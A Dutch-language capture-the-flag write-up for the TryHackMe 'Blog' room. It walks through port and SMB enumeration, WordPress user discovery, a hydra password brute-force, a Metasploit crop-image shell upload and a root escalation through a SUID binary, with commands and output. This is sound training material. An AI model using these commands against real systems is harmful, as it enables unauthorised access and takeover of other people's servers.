# THM Blog - Write-up \(NL\)

**TryHackMe Challenge Link:** [https://tryhackme.com/room/blog](https://tryhackme.com/room/blog)

## Reconnaissance

### Enumeration

we starten bij het enumeraten van de ports op onze target:

```bash
┌──(root💀kali)-[~/CTF-Write-Ups/THM_Blog]
└─# nmap -sS -sV -sC $ip                           
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-06 02:35 EDT
Nmap scan report for 10.10.48.134
Host is up (0.046s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Samba blijkt te draaien op onze target, eens kijken wat enum4linux ons zegt:

```bash
┌──(root💀kali)-[~/CTF-Write-Ups/THM_Blog]
└─# enum4linux $ip        
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Apr  6 02:37:41 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.48.134
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.48.134    |
 ==================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================ 
|    Nbtstat Information for 10.10.48.134    |
 ============================================ 
Looking up status of 10.10.48.134
    BLOG            <00> -         B <ACTIVE>  Workstation Service
    BLOG            <03> -         B <ACTIVE>  Messenger Service
    BLOG            <20> -         B <ACTIVE>  File Server Service
    ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
    WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
    WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
    WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

    MAC Address = 00-00-00-00-00-00

 ===================================== 
|    Session Check on 10.10.48.134    |
 ===================================== 
[+] Server 10.10.48.134 allows sessions using username '', password ''

 =========================================== 
|    Getting domain SID for 10.10.48.134    |
 =========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on 10.10.48.134    |
 ====================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.48.134 from smbclient: 
[+] Got OS info for 10.10.48.134 from srvinfo:
    BLOG           Wk Sv PrQ Unx NT SNT blog server (Samba, Ubuntu)
    platform_id     :    500
    os version      :    6.1
    server type     :    0x809a03

 ============================= 
|    Users on 10.10.48.134    |
 ============================= 
Use of uninitialized value $users in print at ./enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.

Use of uninitialized value $users in print at ./enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.

 ========================================= 
|    Share Enumeration on 10.10.48.134    |
 ========================================= 

    Sharename       Type      Comment
    ---------       ----      -------
    print$          Disk      Printer Drivers
    BillySMB        Disk      Billy's local SMB Share
    IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
```

We hebben dus een share "BillySMB" dat we kunnen enumeraten, uit verdere resultaten bleek dat er een unix user "bjoel" werd aangetroffen.

_\*_ verder uitwerken

Nadat we de 'rabbit hole' van de SMB-methode hebben gecheckt, gaan we best over tot het enumeraten van de directorys

Ook maar eens checken wat robots.txt zegt:

```text
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
```

We wisten vanuit de nmap-scan dat het om een wordpress-site ging, dus eens kijken of we we admin-pagina kunnen raadplegen

![](.gitbook/assets/thm_blog_wpadmin.png)

## Brute Forcing

Laten we een wpscan uitvoeren op de target, om de wordpress users te krijgen

```bash
──(root💀kali)-[~]
└─# wpscan --url http://10.10.48.134/ --enumerate u                                                                 4 ⨯
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.15
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.48.134/ [10.10.48.134]
[+] Started: Tue Apr  6 02:47:29 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.48.134/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.48.134/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://10.10.48.134/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.48.134/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.48.134/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.48.134/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.0'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.48.134/, Match: 'WordPress 5.0'

[i] The main theme could not be detected.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:10 <==========================================> (10 / 10) 100.00% Time: 00:00:10

[i] User(s) Identified:

[+] bjoel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.48.134/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] kwheel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.48.134/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Apr  6 02:48:38 2021
[+] Requests Done: 56
[+] Cached Requests: 8
[+] Data Sent: 13.645 KB
[+] Data Received: 481.233 KB
[+] Memory used: 126.113 MB
[+] Elapsed time: 00:01:08
```

Zo te zien hebben we een user die we voorheen niet tegenkwamen bij onze enum4linux

Laten we het wachtwoord van kwheel brute-forcen met hydra

```bash
┌──(root💀kali)-[~]
└─# hydra -l kwheel -P /home/kali/Desktop/rockyou.txt 10.10.48.134 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -I 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-06 03:09:42
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.48.134:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username

[STATUS] 1115.00 tries/min, 1115 tries in 00:01h, 14343284 to do in 214:24h, 16 active


[STATUS] 590.33 tries/min, 1771 tries in 00:03h, 14342628 to do in 404:56h, 16 active

[STATUS] 425.00 tries/min, 2975 tries in 00:07h, 14341424 to do in 562:25h, 16 active
[80][http-post-form] host: 10.10.48.134   login: kwheel   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-06 03:16:45
```

Nu hebben we het wachtwoord van kwheel en kunnne we een metasploit-module gebruiken voor het krijgen van een reverse shell

```bash
msf6 > search crop-image

Matching Modules
================

   #  Name                            Disclosure Date  Rank       Check  Description
   -  ----                            ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_crop_rce  2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/wp_crop_rce

msf6 > use 0
```

Nu moeten we enkel de opties USERNAME, PASSWORD, RHOSTS and LHOSTS ingeven en uitvoeren die handel!

## Privilege Escalation

Onze hoofddoelen: user.txt & root.txt. de user-flag kunnen we meestal met een simpele find commando terugvinden

```bash
find / 2>/dev/null | grep user.txt
/home/bjoel/user.txt
```

Enkel bij het cat'en van dit bestand:

```bash
You won't find what you're looking for here.

TRY HARDER
```

Ok, we kunnne wel een extra inspanning leveren, eens zien voor de SUID files:

```bash
find / -perm -u=s -type f 2>/dev/null
```

één file dat uitsteekt is /usr/bin/checker

Op GTFOBins werd niks teruggevonden, dus eens kijken wat er gebeurd als we het uitvoeren:

```bash
ltrace checker
getenv("admin")                                  = nil
puts("Not an Admin")                             = 13
Not an Admin
+++ exited (status 0) +++
```

Dus het krijgt een "admin" environment variabele and print daarna uit "Not an Admin".

Wat zou er gebeuren indien we deze variabele declareren?

```bash
export admin=1
ltrace checker
getenv("admin")                                  = "1"
setuid(0)                                        = -1
system("/bin/bash"
```

Oh dus het probeert bash uit te voeren, met root privileges, wat ons een bash commando teruggeeft met root-privileges, AWESOME!

```bash
checker
id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

Laten we dat commando voor de user flag maar eens opnieuw uitvoeren

```bash
find / 2>/dev/null | grep user.txt
/home/bjoel/user.txt
/media/usb/user.txt
cat /media/usb/user.txt
[REDACTED]
```

Uiteraard ook de root flag

```bash
cat /root/root.txt
[REDACTED]
```

